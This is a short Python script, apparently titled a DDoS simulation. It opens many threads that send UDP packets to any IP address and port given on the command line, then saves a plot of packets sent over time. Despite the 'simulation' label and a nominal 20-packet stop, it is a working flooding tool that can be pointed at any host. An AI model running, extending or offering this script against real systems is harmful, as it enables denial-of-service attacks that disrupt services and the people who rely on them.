import sys
import socket
import threading
import time
import matplotlib.pyplot as plt
import signal

# Variables for tracking packet count
packet_count = 0
start_time = time.time()

# Lock to safely increment the count across threads
from threading import Lock
lock = Lock()

# Flag to stop the attack loop
running = True

# Lists to track time and packet counts for plotting
x_data = []
y_data = []

def flood(target_ip, target_port):
    """Simulate traffic flood to target."""
    global packet_count
    while running:  # Loop will exit when 'running' is set to False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP socket
            sock.sendto(b"Flooding packet", (target_ip, target_port))
            with lock:
                packet_count += 1  # Increase packet count safely
                x_data.append(time.time() - start_time)  # Add the time elapsed
                y_data.append(packet_count)  # Add the packet count
                # Display the packet details (packet number and timestamp)
                print(f"Packet {packet_count} sent at {time.time() - start_time:.2f} seconds")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            sock.close()

def update_plot():
    """Save a plot of packets sent after the attack completes."""
    plt.plot(x_data, y_data)
    plt.title("DDoS Attack Visualization")
    plt.xlabel("Time (seconds)")
    plt.ylabel("Packets Sent")
    
    # Save the plot as an image
    plt.savefig("ddos_attack_result.png")
    print("Plot saved as 'ddos_attack_result.png'")

def handle_shutdown(signal, frame):
    """Handle graceful shutdown when receiving termination signal."""
    global running
    print("Shutting down the attack...")
    running = False  # Stop the attack
    update_plot()  # Save the plot after the attack stops
    sys.exit(0)  # Exit the program

if __name__ == "__main__":
    # Register the signal handler for SIGINT (CTRL+C)
    signal.signal(signal.SIGINT, handle_shutdown)
    
    # Get command-line arguments
    if len(sys.argv) != 4:
        print("Usage: python ddos_simulation.py <target_ip> <target_port> <num_threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3])

    # Launch multiple threads for the attack
    for _ in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port))
        thread.start()

    # Wait until the attack completes or is interrupted
    while running and packet_count < 20:
        print(f"Packets Sent: {packet_count}")
        time.sleep(1)

    # Stop attack once 20 packets are sent
    running = False
    update_plot()  # Save the plot after the attack completes
